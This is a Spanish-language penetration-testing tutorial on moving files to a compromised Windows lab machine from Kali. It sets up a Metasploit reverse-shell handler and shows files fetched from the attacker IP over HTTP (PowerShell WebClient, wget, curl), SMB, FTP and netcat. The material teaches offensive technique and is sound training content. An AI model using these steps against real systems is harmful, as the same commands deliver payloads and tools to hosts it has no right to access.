---
icon: shuffle
---

# Transferencia de ficheros

Con esta tecnica de pasarnos ficheros a traves de la `red` tendremos varias formas de hacerlo, por ejemplo una de ellas es tanto si tenemos un acceso a la maquina victima tanto logico como fisico teniendo una interfaz grafica podremos interactuar con los componentes graficos de la maquina victima, pero si tenemos una `shell reversa` teniendo acceso solo desde terminal tendremos que hacerlo de otras formas.

Teniendo estos `2` escenarios vamos a ver como seria la transferencia de archivos en dichos escenarios.

Teniendo nuestro `kali` como maquina atacante y el `WS02` (`Windows`) como maquina victima, vamos a crearnos una conexion `reversa` a la maquina `WS02` mediante `metasploit` con el `meterpreter`, pero no utilizaremos `meterpreter` utilizaremos la `shell` de `Windows`.

```shell
msfconsole -q
```

Configuramos la escucha de la siguiente forma:

```shell
use multi/handler
set LHOST 192.168.5.205
set LPORT 7777
set PAYLOAD windows/meterpreter/reverse_tcp
run
```

Ejecutamos el `binario` para que nos cree la `shell` desde el `Windows` y veremos lo siguiente en `metasploit`:

```
[*] Started reverse TCP handler on 192.168.5.205:7777 
[*] Sending stage (177734 bytes) to 192.168.5.209
[*] Meterpreter session 1 opened (192.168.5.205:7777 -> 192.168.5.209:61133) at 2025-02-12 05:54:49 -0500

meterpreter >
```

Ya obtendremos la `shell`, ahora vamos a poner en practica la transferencia de archivos por la `red`.

Antes para no tener el `prompt` de `meterpreter` vamos a utilizar la `shell` de `Windows` poniendo el comando `shell` y veremos esto:

```
meterpreter > shell
Process 5648 created.
Channel 1 created.
Microsoft Windows [Versi�n 10.0.19045.3803]
(c) Microsoft Corporation. Todos los derechos reservados.

C:\Users\empleado2\Desktop>
```

Ahora en `kali` vamos a crear un directorio donde vayan a estar los ficheros que queremos transferir:

```shell
mkdir transfer
cd transfer/
echo "texto de prueba" > test.txt
```

### Python Server

Ahora la primera forma de transferir un archivo seria utilizando `python` creando un servidor del mismo de forma temporal y pasarnoslo a traves de la `red`.

> Python2

```
python2 -m SimpleHTTPServer
```

> Python3

```
python3 -m http.server
```

Si seguidamente le indicamos un numero estaremos especificando el puerto en el que queremos abrir el servidor, pero si lo dejamos por defecto se abrira en el puerto `8000`, lo mismo para el `python2`.

Ahora teniendo el servidor abierto en la misma `red` que la maquina victima, si nos vamos al `WS02` con interfaz grafica, abriremos un `PowerShell` y ejecutaremos el siguiente comando:

```powershell
(New-Object System.NET.WebClient).DownloadFile('http://192.168.5.205:8000/test.txt', 'C:\Users\empleado2\Desktop\test.txt')
```

Veremos lo siguiente:

<figure><img src="../../../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>

Vemos que efectivamente se nos guardo en el escritorio, ya que le indicamos con la segunda ruta que nos lo guarde con ese nombre y en esa ubicacion.

En el servidor de `python` veremos algo asi:

```
192.168.5.209 - - [12/Feb/2025 06:05:24] "GET /test.txt HTTP/1.1" 200 -
```

Vemos que la maquina `WS02` realizo una peticion a este server y que se descargo el archivo satisfactoriamente con un `200 Ok`.

Ahora vamos a eliminar el archivo `test.txt` de la maquina `WS02` y vamos a repetir la tecnica pero desde una terminal con una `shell remota` que tenemos en `metasploit`.

Como en la `shell` que hemos obtenido `reversa` tendremos un `CMD` tendremos que invocar un `PowerShell` de la siguiente forma para pasarnos el archivo:

```cmd
powershell -c "(New-Object System.NET.WebClient).DownloadFile('http://192.168.5.205:8000/test.txt', 'C:\Users\empleado2\Desktop\test.txt')"
```

Info:

```
powershell -c "(New-Object System.NET.WebClient).DownloadFile('http://192.168.5.205:8000/test.txt', 'C:\Users\empleado2\Desktop\test.txt')"

C:\Users\empleado2\Desktop>dir
dir
 El volumen de la unidad C no tiene etiqueta.
 El n�mero de serie del volumen es: EC04-B2C8

 Directorio de C:\Users\empleado2\Desktop

12/02/2025  12:14    <DIR>          .
12/02/2025  12:14    <DIR>          ..
05/01/2025  19:09             2.350 Microsoft Edge.lnk
05/01/2025  11:59         1.174.016 Microsoft.ActiveDirectory.Management.dll
11/02/2025  10:27    <DIR>          ncat-portable-5.59BETA1
07/02/2025  11:17             5.120 payload.dll
08/02/2025  13:07         2.035.665 Powerfull-fud.exe
12/02/2025  12:14                16 test.txt
06/02/2025  10:07             7.680 testshell.exe
               6 archivos      3.224.847 bytes
               3 dirs  21.116.174.336 bytes libres

C:\Users\empleado2\Desktop>type test.txt
type test.txt
texto de prueba
```

Y como vemos funciono correctamente.

Con una maquina `linux` se podria hacer igual pero con otros comando y herramientas, por ejemplo una muy utilizada seria con `curl` o con `wget`:

```shell
wget http://192.168.5.205:8000/test.txt
```

Y con `curl`:

```shell
curl -O http://192.168.5.205:8000/test.txt
```

### SMB Server

Ahora si nos lo queremos pasar abriendo un servidor de `smb` desde `kali` podremos hacerlo de la siguiente forma:

```shell
impacket-smbserver -smb2support test .
```

Donde puse `test` es el nombre de la carpeta compartida que vamos a compartir, puede ser cualquier nombre y el `.` le indicamos en que directorio queremos compartir el servidor, en mi caso en este mismo directorio.

Info:

```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
```

Ahora esto ya esta a la escucha y habremos creado un server de `smb` temporal.

Ahora si nos vamos a la maquina `WS02` y tenemos una interfaz grafica, podremos abrir una carpeta y conectarnos de forma remota mediante la direccion `IP`:

<figure><img src="../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

Si pulsamos `ENTER` veremos la carpeta `test`:

<figure><img src="../../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

Si entramos en ella veremos el archivo que estamos compartiendo:

<figure><img src="../../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

Y con esto ya nos podremos pasar el archivo a la maquina victima desde una interfaz grafica.

Pero si tenemos una `shell` tendremos que poner lo siguiente:

```cmd
copy \\192.168.5.205\test\test.txt test.txt
```

Info:

```
copy \\192.168.5.205\test\test.txt test.txt
        1 archivo(s) copiado(s).

C:\Users\empleado2\Desktop>dir
dir
 El volumen de la unidad C no tiene etiqueta.
 El n�mero de serie del volumen es: EC04-B2C8

 Directorio de C:\Users\empleado2\Desktop

12/02/2025  12:25    <DIR>          .
12/02/2025  12:25    <DIR>          ..
05/01/2025  19:09             2.350 Microsoft Edge.lnk
05/01/2025  11:59         1.174.016 Microsoft.ActiveDirectory.Management.dll
11/02/2025  10:27    <DIR>          ncat-portable-5.59BETA1
07/02/2025  11:17             5.120 payload.dll
08/02/2025  13:07         2.035.665 Powerfull-fud.exe
12/02/2025  11:58                16 test.txt
06/02/2025  10:07             7.680 testshell.exe
               6 archivos      3.224.847 bytes
               3 dirs  21.112.156.160 bytes libres

C:\Users\empleado2\Desktop>type test.txt
type test.txt
texto de prueba
```

Y con esto veremos que realizamos la transferencia de forma correcta.

### twistd3 Server

Ahora vamos a ver como compartirnos archivos pero en este caso con un servidor `FTP`, este tiene algunas limitaciones, dependiendo del sistema operativo en el que vayamos a pasarlo o el archivo, pero esta bien conocerla tambien.

```shell
twistd3 -n ftp -r .
```

Con esto estamos creando un servidor `FTP` con acceso `anonimo` en el directorio actual.

Info:

```
2025-02-12T06:28:41-0500 [twisted.scripts._twistd_unix.UnixAppLogger#info] twistd 24.7.0 (/usr/bin/python3 3.12.7) starting up.
2025-02-12T06:28:41-0500 [twisted.scripts._twistd_unix.UnixAppLogger#info] reactor class: twisted.internet.epollreactor.EPollReactor.
2025-02-12T06:28:41-0500 [-] FTPFactory starting on 2121
2025-02-12T06:28:41-0500 [twisted.protocols.ftp.FTPFactory#info] Starting factory <twisted.protocols.ftp.FTPFactory object at 0x7fa95d0bbe30>
```

Ahora que esta abierto el servidor, si nos vamos a la maquina `WS02` con la interfaz grafica, podremos pasarnos el archivo de la siguiente forma:

Abriremos `PwerShell`:

```powershell
ftp
```

Info:

```
ftp>
```

Y ahora abriremos una conexion con el servidor que hemos abierto en el `kali`:

```powershell
open 192.168.5.205 2121
```

Info:

```
Conectado a 192.168.5.205.
220 Twisted 24.7.0 FTP Server
530 Please login with USER and PASS.
Usuario (192.168.5.205:(none)): anonymous
331 Guest login ok, type your email address as password.
Contraseña:
230 Anonymous login ok, access restrictions apply.
```

Y con esto ya estaremos dentro del servidor temporal que creamos con `FTP`, ahora si nosotros metemos un comando y no esta permitido el acceso a una `red` externa de `Windows` va a requerir privilegios de administrador locales y si no los tenemos sera algo mas limitado, por eso es una tecnica un poco peor, pero pongamos que los tenemos, le tendremos que dar a permitir:

<figure><img src="../../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

Y si ahora volvemos hacer un `dir` veremos lo siguiente:

```
200 PORT OK
125 Data connection already open, starting transfer
-rw-rw-r--   1 kali      kali                    5 Feb 12 11:28 twistd.pid
-rw-rw-r--   1 kali      kali                   16 Feb 12 10:58 test.txt
226 Transfer Complete.
ftp: 153 bytes recibidos en 0.01segundos 10.20a KB/s.
```

Vemos que esta el archivo `test.txt`, ahora nos lo descargaremos de la siguiente forma:

```powershell
get test.txt
```

Y si salimos con `bye` y listamos con un `dir`, veremos que esta el archivo correctamente:

```
    Directorio: C:\Users\empleado2


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-r---        05/01/2025     19:08                3D Objects
d-r---        05/01/2025     19:08                Contacts
d-r---        12/02/2025     12:26                Desktop
d-r---        05/01/2025     19:08                Documents
d-r---        05/01/2025     19:08                Downloads
d-r---        05/01/2025     19:08                Favorites
d-r---        05/01/2025     19:08                Links
d-r---        05/01/2025     19:08                Music
d-r---        06/01/2025      9:40                OneDrive
d-r---        05/01/2025     19:09                Pictures
d-r---        05/01/2025     19:08                Saved Games
d-r---        05/01/2025     19:08                Searches
d-r---        05/01/2025     19:08                Videos
-a----        12/02/2025     12:35             16 test.txt
```

En `linux` seria mas sencillo, con poner este comando:

```shell
ftp anonymous@192.168.5.205 2121
```

Dejamos la contraseña en blanco y veremos que estamos dentro, listamos con un `ls`:

```
229 Entering Extended Passive Mode (|||36645|).
125 Data connection already open, starting transfer
-rw-rw-r--   1 kali      kali                    5 Feb 12 11:28 twistd.pid
-rw-rw-r--   1 kali      kali                   16 Feb 12 10:58 test.txt
226 Transfer Complete.
```

Y ya con el `get` nos descargariamos el archivo, etc...

### Netcat Server

Tambien lo podemos transferir utilizando un servidor de `netcat` pero esto es menos realista, ya que es muy complicado utilizar esta herramienta en `Windows` en `linux` seria mas facil, pero en `Windows` tendriamos que pasarnos el bianrio de `netcat` a la maquina y desde ahi ejecutarlo, en una organizacion el `firewall` puede cortar este tipo de conexiones, por lo que no seria muy recomendable hacerlo, pero si se pudiera seria de la siguiente forma:

> Kali

```shell
nc 192.168.5.209 4444 -w 3 < test.txt
```

> Windows

```powershell
.\ncat.exe -lvp 4444 > test.txt
```
